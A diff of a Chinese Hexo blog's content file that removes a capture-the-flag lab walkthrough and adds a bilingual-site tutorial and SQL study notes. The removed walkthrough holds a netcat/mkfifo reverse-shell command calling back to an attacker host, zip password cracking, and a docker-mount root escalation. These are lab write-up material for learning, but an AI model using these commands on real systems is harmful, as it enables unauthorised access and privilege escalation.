-<p>判断靶机IP,根据ping测试的ttl值判断目标靶机IP为192.168.88.139</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426171143353.png" alt="image-20210426171143353"></p>
-<p>确定目标靶机IP是192.168.101.139</p>
-<h3 id="2-根据获得的靶机IP-继续扫描靶机相关的服务开放状态"><a href="#2-根据获得的靶机IP-继续扫描靶机相关的服务开放状态" class="headerlink" title="2.根据获得的靶机IP,继续扫描靶机相关的服务开放状态"></a>2.根据获得的靶机IP,继续扫描靶机相关的服务开放状态</h3><p>使用nmap扫描相应的端口及服务的开发情况</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV 192.168.88.139 -p- --min-rate=2000 -n -vv </span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/27/3u7WfI1zq2pOLbh.png" alt=""></p>
-<p><img src="https://i.loli.net/2021/04/27/IF6QzsTh9Bkx5KR.png" alt=""></p>
-<p>查询结果如下,发现21(FTP),80(HTTP),22(SSH)端口处于开放状态</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426175334078.png" alt=""></p>
-<p>发现FTP服务允许匿名登录(Anonymous FTP login allowed);SSH,HTTP服务启动</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426180937065.png" alt=""></p>
-<h3 id="3-根据开放的端口及服务查询相应服务的漏洞"><a href="#3-根据开放的端口及服务查询相应服务的漏洞" class="headerlink" title="3.根据开放的端口及服务查询相应服务的漏洞"></a>3.根据开放的端口及服务查询相应服务的漏洞</h3><h4 id="利用FTP服务漏洞"><a href="#利用FTP服务漏洞" class="headerlink" title="利用FTP服务漏洞"></a>利用FTP服务漏洞</h4><p>根据nmap查询结果发现21端口允许匿名用户登录,存在<a href="https://www.jianshu.com/p/9498ccf62348">匿名登录漏洞</a></p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426175649800.png" alt=""></p>
-<p>匿名登录ftp,下载并查看note.txt</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ftp 192.168.101.129</span><br><span class="line"><span class="meta">#</span><span class="bash">输入匿名用户用户名Anonymous及密码登录</span></span><br><span class="line">get note.txt #下载note.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426180549492.png" alt=""></p>
-<p>并未能提供有效信息</p>
-<h4 id="利用HTTP"><a href="#利用HTTP" class="headerlink" title="利用HTTP"></a>利用HTTP</h4><p>80端口是Apache httpd 2.4.29 可能存在<a href="https://cloud.tencent.com/developer/article/1676145">换行解析漏洞</a></p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426185523428.png" alt=""></p>
-<p>打开网站判断是静态网站还是动态网站,发现是个静态网站,没有可利用的后台数据库,没有漏洞点</p>
-<p><img src="https://i.loli.net/2021/04/27/WSPdvcLpRNF34hu.png" alt=""></p>
-<p>继续对网站的目录进行探测(使用使用目录扫描工具dirb)</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.88.139</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/QrlZORBogVxzby7.png" alt=""></p>
-<p>发现secret目录,可能存在命令执行漏洞</p>
-<p><img src="https://i.loli.net/2021/04/26/HRVSi54yGpbgY6B.png" alt=""></p>
-<p>浏览器输入网址,发现好像可以运行命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.88.139&#x2F;secret&#x2F;</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/zZ1JTYuI8BtW6Aw.png" alt=""></p>
-<p>输入ls查看当前目录下文件,发现ls命令被过滤,不允许使用</p>
-<p><img src="https://i.loli.net/2021/04/26/ZaXyHArhQ1xnpjz.png" alt=""></p>
-<p>输入pwd查看当前位置</p>
-<p><img src="https://i.loli.net/2021/04/26/9PVKRD7v5nXMlWo.png" alt=""></p>
-<h2 id="三-边界突破"><a href="#三-边界突破" class="headerlink" title="三.边界突破"></a>三.边界突破</h2><h3 id="1-漏洞利用"><a href="#1-漏洞利用" class="headerlink" title="1.漏洞利用"></a>1.漏洞利用</h3><p>使用NetCat开启监听</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 6666</span><br></pre></td></tr></table></figure>
-<p><a href="https://www.freebuf.com/articles/web/247967.html">反弹shell</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.88.136/6666 0&gt;&amp;1 #失败</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/xr6ykvZJIEgtlNi.png" alt=""></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.88.136 6666&gt;/tmp/f#成功</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/e1YCjQZcLGVwB7b.png" alt=""></p>
-<p>反弹shell成功</p>
-<p><img src="https://i.loli.net/2021/04/26/J6zWLx7XdiFhrtG.png" alt=""></p>
-<p>使用id命令查看用户的ID,以及所属群组的ID,可以看出www-data用户权限较低</p>
-<p><img src="https://i.loli.net/2021/04/26/WZxJvmg8XQhpjT5.png" alt=""></p>
-<p>进入根目录并查看</p>
-<p><img src="https://i.loli.net/2021/04/26/xlQOi9ECqhtoVHw.png" alt=""></p>
-<p>查看相关目录,仍未获得有用的信息</p>
-<p><img src="https://i.loli.net/2021/04/26/ZK92yTH3rQGWJnO.png" alt=""></p>
-<p>查看home目录,发现有三个用户(anurodh,apaar,aurick)</p>
-<p><img src="https://i.loli.net/2021/04/26/xLRowz5KbQpe8m9.png" alt="image-20210426195916513"></p>
-<p>尝试进入各用户目录,发现能进入apaar目录</p>
-<p><img src="https://i.loli.net/2021/04/26/m1eNVnqGAHOds4g.png" alt=""></p>
-<p>查看apaar目录发现local.txt(无法查看),</p>
-<p><img src="https://i.loli.net/2021/04/26/cvKBTFymJCqstkg.png" alt=""></p>
-<h3 id="2-横向扩展"><a href="#2-横向扩展" class="headerlink" title="2.横向扩展"></a>2.横向扩展</h3><p>使用sudo -l查看所能执行的高权限指令和文件</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p>发现.helpline.sh</p>
-<p><img src="https://i.loli.net/2021/04/26/gWeUCuE7mXAYc6R.png" alt=""></p>
-<p>查看/home/apaar/.helpline.sh</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /home/apaar/.helpline.sh</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/lnSWQ9TuaN81hFg.png" alt=""></p>
-<p>发现该脚本允许输入,尝试输入一些命令查看local.txt</p>
-<p>运行.helpline.sh</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./.helpline.sh</span><br></pre></td></tr></table></figure>
-<p>输入命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat local.txt</span><br></pre></td></tr></table></figure>
-<p>无法查看</p>
-<p><img src="https://i.loli.net/2021/04/26/IcbgH6snUFLiQJD.png" alt=""></p>
-<p>尝试使用apaar用户查看</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u 用户名 ./.helpline.sh</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/51TseuLIp9WqPHR.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww&#125;</span><br></pre></td></tr></table></figure>
-<p>最终拿到用户flags</p>
-<p>继续尝试寻找root的flags</p>
-<p>继续寻找可疑信息,发现/var/www/files下有可疑文件</p>
-<p><img src="https://i.loli.net/2021/04/26/KVMgwEY4Gtx6NCq.png" alt=""></p>
-<p>查看hacker.php</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat hacker.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/xYzkO8smG1anLwu.png" alt=""></p>
-<p>发现img标签中指向一个可以图片,使用nc下载可疑图片</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 5555 &gt; hacker.jpg #kali新开shell</span><br><span class="line">nc 192.168.88.136 5555 &lt; images/hacker-with-laptop_23-2147985341.jpg #反弹shell中</span><br></pre></td></tr></table></figure>
-<p>打开图片如下</p>
-<p><img src="https://i.loli.net/2021/04/26/9ZLNSD5MKgaWYvR.png" alt=""></p>
-<p>考虑有没有可能使用隐写术隐藏关键内容</p>
-<p>隐写术实例</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">copy /b 2.jpg+1.zip output.jpg</span><br></pre></td></tr></table></figure>
-<p>下载steghide工具</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install steghide</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/4GZH96DKicq3Q7a.png" alt=""></p>
-<p>查看图片中是否隐藏有内容</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">steghide info hacker.jpg</span><br></pre></td></tr></table></figure>
-<p>发现其中嵌入了一个名为backup.zip的压缩包</p>
-<p><img src="https://i.loli.net/2021/04/26/8NyOtZcnaJ49qSs.png" alt=""></p>
-<p>使用steghide获取该压缩包</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">steghide extract -sf hacker.jpg </span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/jXtNpaoLSscUIiR.png" alt=""></p>
-<p>查看backup.zip中的内容</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip -sf backup.zip</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/RobJ241uzjhLeT6.png" alt=""></p>
-<p>尝试解压该压缩包</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unzip backup.zip</span><br></pre></td></tr></table></figure>
-<p>发现需要密码</p>
-<p><img src="https://i.loli.net/2021/04/26/NnXZfyUhDF6ri2Q.png" alt=""></p>
-<p>使用John爆破</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">先将backup.zip转换成backup.john</span></span><br><span class="line">zip2john backup.zip &gt; backup.john</span><br><span class="line"><span class="meta">#</span><span class="bash">再使用john爆破</span></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt backup.zip</span><br></pre></td></tr></table></figure>
-<p>发现密码为pass1word</p>
-<p><img src="https://i.loli.net/2021/04/26/2WpkaEDAVzqw91F.png" alt=""></p>
-<p>解压backup.zip</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unzip backup.zip</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/q4ajLeMKOh6zWJ9.png" alt=""></p>
-<p>获得source_code.php文件</p>
-<p><img src="https://i.loli.net/2021/04/26/QLvoqj1XDGWV7UT.png" alt=""></p>
-<p>查看source_code.php,发现可疑密码和用户名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可疑密码:IWQwbnRLbjB3bVlwQHNzdzByZA&#x3D;&#x3D;</span><br><span class="line">用户名:Anurodh</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/YJCoa4St6RjrUEu.png" alt="image-20210426210916149"></p>
-<p>到Base64解密网站解密</p>
-<p><img src="https://i.loli.net/2021/04/26/vRjZdbe4qyJUspm.png" alt=""></p>
-<p>密码为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!d0ntKn0wmYp@ssw0rd</span><br></pre></td></tr></table></figure>
-<p>使用ssh登录,先尝试可疑用户Anurodh</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh anurodh@192.168.88.139 #成功,注意名字是小写a</span><br></pre></td></tr></table></figure>
-<p>登录成功</p>
-<p><img src="https://i.loli.net/2021/04/26/D5LTYFab7f31V9h.png" alt=""></p>
-<p>使用id命令查看用户的ID,以及所属群组的ID,发现其中有docker</p>
-<p><img src="https://i.loli.net/2021/04/26/JVYsKEo2vwqSrPj.png" alt="image-20210426212318640"></p>
-<p>尝试利用<a href="https://www.freebuf.com/articles/system/170783.html">docker漏洞</a>获取root权限(将外面的文件映射到docker容器中,docker中是以root运行的)</p>
-<p>查看docker镜像</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/nK3ZoPrD2lQGbBY.png" alt=""></p>
-<p>将根目录挂载到/mnt并放入alpine镜像</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it -v /:/mnt alpine</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/1Lnopjmg2F9qDZY.png" alt="image-20210426213345460"></p>
-<p>查看id</p>
-<p><img src="https://i.loli.net/2021/04/26/qdyLvrmj9XNgxcO.png" alt=""></p>
-<p>查看/root没有发现信息</p>
-<p>继续查看相关目录,发现/mnt下有一个root目录</p>
-<p><img src="https://i.loli.net/2021/04/26/ZrMKItUjVe2gEQ5.png" alt="image-20210426213931659"></p>
-<p>进入/mnt/root并查看,发现有个proof.txt</p>
-<p><img src="https://i.loli.net/2021/04/26/oVD9MzpJ2UGA1ba.png" alt=""></p>
-<p>查看proof.txt</p>
-<p><img src="https://i.loli.net/2021/04/26/Z85j6lciFKok91W.png" alt=""></p>
-<p>成功得到root的flag</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Hack</category>
-      </categories>
-      <tags>
-        <tag>Hack</tag>
-        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -3796,16 +3534,58 @@
 ]]></content>
   </entry>
   <entry>
-    <title>教你定时发送天气邮件</title>
-    <url>/article/a1a28d7.html</url>
-    <content><![CDATA[<h1 id="教你定时发送天气邮件"><a href="#教你定时发送天气邮件" class="headerlink" title="教你定时发送天气邮件"></a>教你定时发送天气邮件</h1><a id="more"></a>
+    <title>Hexo的next主题实现双语功能</title>
+    <url>/article/99e78227.html</url>
+    <content><![CDATA[<h1 id="Hexo的next主题实现双语功能"><a href="#Hexo的next主题实现双语功能" class="headerlink" title="Hexo的next主题实现双语功能"></a>Hexo的next主题实现双语功能</h1><a id="more"></a>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前不久,给博客添加了Google Analytics,通过数据显示,发现我这小破站寥寥无几的流量大部分竟然是国外朋友贡献的,心中便想着将博客国际化—-搞个英文版本.说干就干,经过我的一番折腾,终于给搞出来了,但我要说明一下文章的内容是要自己转换为英文,具体效果大家可以点击下面链接前往查看</p>
+<p><a href="https://en.idefun.com/" class="LinkCard" target="_blank">英文版本</a></p>
+<h2 id="诉求"><a href="#诉求" class="headerlink" title="诉求"></a>诉求</h2><p>首先说说我对英文网站的诉求:</p>
+<ol>
+<li>英文网站要与原网站的结构外观基本保持一致(我看到有的小伙伴直接换支持双语的主题了,我可不想让自己的心血白流)</li>
+<li>我希望原网站和英文网站有个切换按钮,很容易切换</li>
+</ol>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h3><p>在hexo本地目录创建英文文件夹(名字自定义),我的是en</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320154606919.png" alt=""></p>
+<p>复制hexo目录的内容(node_modules除外)到en文件夹,复制后en文件夹如下</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320154912791.png" alt=""></p>
+<p>安装相关插件,在en文件夹使用命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>
+<p>修改en文件夹中_config.yml文件,将下图中的language改为en,可以比对着hexo本地目录的_config.yml文件将中文改为相应的英文(如下图的title,subtitle等)</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320155305119.png" alt=""></p>
+<p>修改hexo目录next主题配置文件_config.yml文件,找到menu字段,增添language菜单,注意链接要换成自己的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">language: https:&#x2F;&#x2F;en.idefun.com&#x2F; || fa fa-language</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320155819757.png" alt=""></p>
+<p>修改next主题文件夹下的languages中的zh-CN.yml,找到menu,添加language:English</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160213558.png" alt=""></p>
+<p>可以在hexo目录使用hexo s查看效果</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160423212.png" alt=""></p>
+<p>同理,修改en文件夹中next主题配置文件_config.yml文件,找到menu字段,增添中文菜单</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">中文: https:&#x2F;&#x2F;www.idefun.com&#x2F; || fa fa-language</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160547373.png" alt=""></p>
+<p>修改en文件夹下themes中next主题文件夹下的languages中的en.yml,找到menu,添加language:中文</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160801285.png" alt=""></p>
+<p>可以在en目录使用hexo s查看效果</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320160357274.png" alt=""></p>
+<h3 id="部署配置"><a href="#部署配置" class="headerlink" title="部署配置"></a>部署配置</h3><p>下面提供两种部署方法,第一种不用再创建仓库,第二种要再创建仓库,若想要给英文博客绑定域名建议选择第二种,关于创建仓库及打开github page就不多说了</p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在en文件夹生成英文博客,并将生成的public文件夹中的内容复制到hexo目录下的public文件夹中的en文件夹,推送时只需在hexo目录下推送</p>
+<h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p>使用下面命令即可实现</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; cd en &amp;&amp;  hexo clean &amp;&amp; hexo g &amp;&amp; cd ..&#x2F; &amp;&amp; cp -r en&#x2F;public&#x2F;. public&#x2F;en&#x2F; &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
+<p>可以写成shell脚本,我这里提供一份简单的脚本供大家参考</p>
+<p><a href="https://idefun.lanzous.com/i4cz6n4ov7e" class="LinkCard">点击下载</a></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320162843893.png" alt=""></p>
+<p>下载后改后缀为sh即可双击运行</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320162956255.png" alt=""></p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>在en文件夹生成英文博客,将生成英文博客推送到一个新的仓库,需要分别推送,可以编写相应脚本来简化操作</p>
+<h5 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h5><p>修改en文件夹在_config.yml文件,找到deploy字段,修改为自己的仓库即可</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320163232780.png" alt=""></p>
+<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>为大家提供一种思路,希望有帮助</p>
 ]]></content>
       <categories>
-        <category>github</category>
+        <category>hexo</category>
       </categories>
       <tags>
-        <tag>github action</tag>
-        <tag>github</tag>
+        <tag>hexo</tag>
+        <tag>next</tag>
       </tags>
   </entry>
   <entry>
@@ -4423,6 +4203,342 @@
       </categories>
       <tags>
         <tag>密码学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>数据库学习笔记</title>
+    <url>/article/49140.html</url>
+    <content><![CDATA[<h1 id="数据库学习笔记"><a href="#数据库学习笔记" class="headerlink" title="数据库学习笔记"></a>数据库学习笔记</h1><a id="more"></a>
+<h2 id="数据库的相关概念"><a href="#数据库的相关概念" class="headerlink" title="数据库的相关概念"></a>数据库的相关概念</h2><h3 id="DB"><a href="#DB" class="headerlink" title="DB"></a>DB</h3><p>数据库(database) :存储数据的”仓库”,它保存了一系列有组织的数据</p>
+<h4 id="数据库存储的特点"><a href="#数据库存储的特点" class="headerlink" title="数据库存储的特点"></a>数据库存储的特点</h4><ol>
+<li>将数据放到表中,表再放到库中</li>
+<li>一个数据库中可以有多个表,每个表都有一个的名字,用来标识自己.表名具有唯一性</li>
+<li>表具有一些特性,这些特性定义了数据在表中如何存储</li>
+<li>表由列组成,我们也称为字段.所有表都是由一个或多个列组成的</li>
+<li>表中的数据是按行存储的</li>
+</ol>
+<h3 id="DBMS"><a href="#DBMS" class="headerlink" title="DBMS"></a>DBMS</h3><p>数据库管理系统(Database Management System).数据库是通过DBMS创建和操作的容器</p>
+<p>常见的数据库管理系统:MySQL、Oracle、DB2、SqlServer等</p>
+<h4 id="DBMS分为两类"><a href="#DBMS分为两类" class="headerlink" title="DBMS分为两类"></a>DBMS分为两类</h4><ul>
+<li>基于共享文件系统的DBMS(Access)</li>
+<li>基于客户机—服务器的DBMS(MySQL、Oracle、SqlServer)</li>
+</ul>
+<h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><ul>
+<li>成本低,开放源代码,一般可以免费试用</li>
+<li>性能高,执行很快,可移植性好</li>
+<li>简单,很容易安装和使用</li>
+<li>社区版(免费),企业版(收费)</li>
+</ul>
+<h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>结构化查询语言(Structure Query Language) :专门用来与数据库通信的语言</p>
+<h4 id="SQL的优点"><a href="#SQL的优点" class="headerlink" title="SQL的优点"></a>SQL的优点</h4><ol>
+<li>不是某个特定数据库供应商专有的语言,几乎所有DBMS都支持SQL</li>
+<li>简单易学</li>
+<li>虽然简单,但实际上是一种强有力的语言,灵活使用其语言元素,可以进行非常复杂和高级的数据库操作</li>
+</ol>
+<h2 id="MySQL的下载安装"><a href="#MySQL的下载安装" class="headerlink" title="MySQL的下载安装"></a>MySQL的下载安装</h2><h3 id="下载MySQL"><a href="#下载MySQL" class="headerlink" title="下载MySQL"></a>下载MySQL</h3><p><a href="https://dev.mysql.com/downloads/installer/">下载地址</a></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302094528470.png" alt=""></p>
+<p>点击Download后,可能出现下面的页面,点击红框所选部分</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302094703889.png" alt=""></p>
+<h3 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h3><p>找到下载的MySQL安装文件,双击运行</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302095639682.png" alt=""></p>
+<p>等待片刻</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302095740307.png" alt=""></p>
+<p>选择Developer Default,点击next</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303093015459.png" alt=""></p>
+<p>点击Execute</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303093138351.png" alt=""></p>
+<p>等待下载,之后点击Next</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303093211445.png" alt=""></p>
+<p>点击Next</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094141765.png" alt=""></p>
+<p>点击Next</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094228963.png" alt=""></p>
+<p>点击Next</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094310677.png" alt=""></p>
+<p>设置管理员密码,之后点击Next</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094452191.png" alt=""></p>
+<p>点击Next</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094649157.png" alt=""></p>
+<p>点击Execute</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094735428.png" alt=""></p>
+<p>点击Finish</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095153339.png" alt=""></p>
+<p>点击Next</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095216696.png" alt=""></p>
+<p>点击Finish</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095243443.png" alt=""></p>
+<p>点击Next</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095315014.png" alt=""></p>
+<p>输入密码,之后点击Check</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095359691.png" alt=""></p>
+<p>连接成功,点击Next</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095426064.png" alt=""></p>
+<p>点击Execute</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095459981.png" alt=""></p>
+<p>点击Finish</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095531238.png" alt=""></p>
+<p>点击Next</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095601082.png" alt=""></p>
+<p>点击Finish,安装完毕</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095619642.png" alt=""></p>
+<h2 id="关系数据库标准语言SQL"><a href="#关系数据库标准语言SQL" class="headerlink" title="关系数据库标准语言SQL"></a>关系数据库标准语言SQL</h2><h3 id="学生-课程数据库"><a href="#学生-课程数据库" class="headerlink" title="学生-课程数据库"></a>学生-课程数据库</h3><table>
+    <caption>Student</caption>
+    <tr>
+        <th>学号</br>Sno</th>
+        <th>姓名</br>Sname</th>
+        <th>性别</br>Ssex</th>
+        <th>年龄</br>Sage</th>
+        <th>所在系</br>Sdept</th>
+    </tr>
+    <tr>
+        <td>201215121</td>
+        <td>李勇</td>
+        <td>男</td>
+        <td>20</td>
+        <td>CS</td>
+    </tr>
+    <tr>
+        <td>201215122</td>
+        <td>刘晨</td>
+        <td>女</td>
+        <td>19</td>
+        <td>CS</td>
+    </tr>
+    <tr>
+        <td>201215123</td>
+        <td>王敏</td>
+        <td>女</td>
+        <td>18</td>
+        <td>MA</td>
+    </tr>
+    <tr>
+        <td>201215125</td>
+        <td>张立</td>
+        <td>男</td>
+        <td>19</td>
+        <td>IS</td>
+    </tr>
+</table>
+<table>
+    <caption>Course</caption>
+    <tr>
+        <th>课程号</br>Cno</th>
+        <th>课程名</br>Cname</th>
+        <th>先行课</br>Cpno</th>
+        <th>学分</br>Ccredit</th>
+    </tr>
+    <tr>
+        <td>1</td>
+        <td>数据库</td>
+        <td>5</td>
+        <td>4</td>
+    </tr>
+    <tr>
+        <td>2</td>
+        <td>数学</td>
+        <td></td>
+        <td>2</td>
+    </tr>
+    <tr>
+        <td>3</td>
+        <td>信息系统</td>
+        <td>1</td>
+        <td>4</td>
+    </tr>
+    <tr>
+        <td>4</td>
+        <td>操作系统</td>
+        <td>6</td>
+        <td>3</td>
+    </tr>
+    <tr>
+        <td>5</td>
+        <td>数据结构</td>
+        <td>7</td>
+        <td>4</td>
+    </tr>
+    <tr>
+        <td>6</td>
+        <td>数据处理</td>
+        <td></td>
+        <td>2</td>
+    </tr>
+    <tr>
+        <td>7</td>
+        <td>PASCAL语言</td>
+        <td>6</td>
+        <td>4</td>
+    </tr>
+</table>
+<table>
+    <caption>SC</caption>
+    <tr>
+        <th>学号</br>Sno</th>
+        <th>课程号</br>Cno</th>
+        <th>成绩</br>Grade</th>
+    </tr>
+    <tr>
+        <td>201215121</td>
+        <td>1</td>
+        <td>92</td>
+    </tr>
+    <tr>
+        <td>201215121</td>
+        <td>1</td>
+        <td>92</td>
+    </tr>
+    <tr>
+        <td>201215121</td>
+        <td>2</td>
+        <td>85</td>
+    </tr>
+    <tr>
+        <td>201215121</td>
+        <td>3</td>
+        <td>88</td>
+    </tr>
+    <tr>
+        <td>201215122</td>
+        <td>2</td>
+        <td>90</td>
+    </tr>
+    <tr>
+        <td>201215122</td>
+        <td>3</td>
+        <td>80</td>
+    </tr>
+</table>
+### 数据定义
+
+
+
+### 数据查询
+
+#### 单表查询
+
+##### 选择表中若干列
+
+> 查询全体学生的姓名,出生年份和所在的院系,要求用小写字母表示系名(现在年份为2021)
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,<span class="string">&#x27;Year of Birth&#x27;</span>,<span class="number">2021</span><span class="operator">-</span>Sage,<span class="built_in">LOWER</span>(Sdept)</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br></pre></td></tr></table></figure>
+![](https://gitee.com/wxpgitee/images/raw/master/image-20210329222607438.png)
+
+> 通过指定别名改变查询结果的列标题
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname NAME,<span class="string">&#x27;Year of Birth&#x27;</span> BIRTH,<span class="number">2021</span><span class="operator">-</span>Sage BIRTHDAY,<span class="built_in">LOWER</span>(Sdept) DEPARTMENT</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br></pre></td></tr></table></figure>
